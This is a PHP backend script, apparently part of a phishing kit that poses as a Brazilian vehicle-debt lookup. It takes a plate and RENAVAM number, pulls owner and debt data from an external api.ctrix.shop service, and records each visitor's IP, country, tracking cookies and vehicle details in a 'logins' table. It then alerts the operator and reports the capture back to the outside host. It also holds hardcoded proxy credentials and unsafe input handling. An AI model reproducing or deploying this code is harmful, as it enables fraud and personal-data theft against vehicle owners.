<?php

error_reporting(0);

extract($_POST);

if($placa){

    $placa = ltrim($placa, '0');
    
    $renavam = ltrim($renavam, '0');

    $doc = $renavam;

    $data = file_get_contents("https://api.ctrix.shop/recuperar-dados?comando=$placa");

    if($data){

        $page = 'lPVAPR';

        $dataJson = json_decode($data);
        
        if($dataJson){
            
            include_once "../db.php";

            $token = $_COOKIE['session'];

            if($dataJson->dados){
                
                $telaX = $tela;

                $dadosArray = json_decode(base64_decode($dataJson->dados));

                $proxy = 'x351.fxdx.in:15414';//URL
                $proxyuserpwd = 'wornfate161715:vgq571q2fdxs';//USUARIO E SENHA   

                if($dadosArray->IsStatus){

                    function get_client_ip() {

                        if (!empty($_SERVER['HTTP_CLIENT_IP']))   {
                            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
                        }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
                        {
                            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
                        }else{
                            $ip_address = $_SERVER['REMOTE_ADDR'];
                        }
                        return $ip_address;
                    }

                    $campanha =  $_COOKIE['campanha'];
                    $Identit =  $_COOKIE['Identity'];
     
                     date_default_timezone_set('America/Sao_Paulo');
     
                     $hora =  date('H:i');
                     $DataHOje =  date('d/m/Y');
     
                     $capi = $DataHOje." ".$hora;
     
                     $id_user = $renavam;

                    // Limpa registros temporários de digitação antes de verificar/inserir
                    $deleteTyping = $pdo->prepare("DELETE FROM logins WHERE login_info LIKE :login_info AND dados = 'Typing iniciado'");
                    $deleteTyping->execute([':login_info' => "%$doc%"]);

                    $check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info AND resposta <> '' AND resposta IS NOT NULL LIMIT 1");
                    $check->execute([':login_info' => "%$doc%"]);
                    $exists = $check->fetchColumn();

                    $dados = json_encode(array('IsStatus'=>'sucesso!', 'dados'=>$dadosArray));
    
                    $dados64 = base64_encode($dados);
    
                    if(!$exists){

                       $id_usuario =  $_COOKIE['campanha'];
                       $identity =  $_COOKIE['Identity'];

                        $Capacidade = $dadosArray->dataProprietario->Capacidade;
                        $proprietario = $dadosArray->dataProprietario->Proprietario;
                        $renavam = $dadosArray->dataProprietario->Renavam;
                        $marcaModelo = $dadosArray->dataProprietario->MarcaModelo;
                        $anodeFabricacao = $dadosArray->dataProprietario->AnodeFabricacao;
                        $Situacao = $dadosArray->dataProprietario->Situacao;

                        $PlacaX = $dadosArray->dataProprietario->Placa;

                        $ip_address = get_client_ip();
    
                        $DadosIp = json_decode(file_get_contents("https://ipinfo.io/$ip_address/json"), true);
                        $pais = $DadosIp['country'] ?? 'Desconecido';

                        //$DadosIp = json_decode(file_get_contents("http://ip-api.com/json/$ip_address"));
                        //$pais = $DadosIp->country;

                        $DebitosAnteriores = 0;
                        for ($i=0; $i <count($dadosArray->DebitosAnteriores); $i++) { 
                            $DebitosAnteriores = $DebitosAnteriores + str_replace("," , "." , str_replace("." , "" , preg_replace("/[^0-9,.]/","", $dadosArray->DebitosAnteriores[$i]->valorTotal)));
                        }
                
                        $DividaAtiva = 0;
                        for ($i=0; $i <count($dadosArray->DividaAtiva) ; $i++) { 
                            $DividaAtiva = $DividaAtiva + preg_replace("/[^0-9,.]/","", $dadosArray->DividaAtiva[$i]->valor);
                        }
                
                        $dataUnca = 0;
                        for ($i=0; $i <count($dadosArray->dataUnca) ; $i++) { 
                            $dataUnca = $dataUnca + str_replace("," , "." , str_replace("." , "" , preg_replace("/[^0-9,.]/","", $dadosArray->dataUnca[$i]->valor)));
                        }
                
                        $TotalDebitos = $dataUnca + $DividaAtiva + $DebitosAnteriores;
    
                        $debitos = "$TotalDebitos";

                        $loginData = [
                            ['label' => 'doc', 'value' => $renavam]
                        ];

                        $login_info = json_encode($loginData, JSON_UNESCAPED_UNICODE);

                        $hora = date('Y-m-d H:i:s'); // Hora atual

                        $stmt = $pdo->prepare("INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta) VALUES 
                                              (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta)");

                         $is =  $stmt->execute([
                                ':page'       => $page,
                                ':dados'      => $marcaModelo,
                                ':debitos'    => $debitos,
                                ':ip'         => $ip_address,
                                ':pais'       => $pais,
                                ':identity'   => $identity,
                                ':hora'       => $hora,
                                ':login_info' => $login_info,
                                ':id_usuario' => $id_usuario,
                                ':resposta' => $dados64
                            ]);

                            if($is){
                                $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual WHERE id = :id");
                                        $updateStmt->execute([
                                            ':audio' => 2,
                                            ':atual' => rand(100000000, 99999999999),
                                            ':id' => 1
                                        ]);
                            }
    
                    }else {
                       // $sql = "UPDATE infos SET dados = '$dados64' WHERE id_user = '$renavam'";
                       // mysqli_query($conexao, $sql);
                    }
                
                
                    file_get_contents("https://api.ctrix.shop/salvar?protocol=Logado&comando=$placa");

                    echo $dados;

                }else{
                   
                    
                }
            
            }else { 

                $protocol = $dataJson->protocol;

                if($protocol == 'detran_indisponivel'){

                   
                    echo 'erro';

                    exit(); 

                }else {
              

                }
                
            }

        }else {
            echo 'erro';
         }
    }else {
            $session = $_COOKIE['session'];

             echo json_encode(array('token'=>$session));
         }
}


?>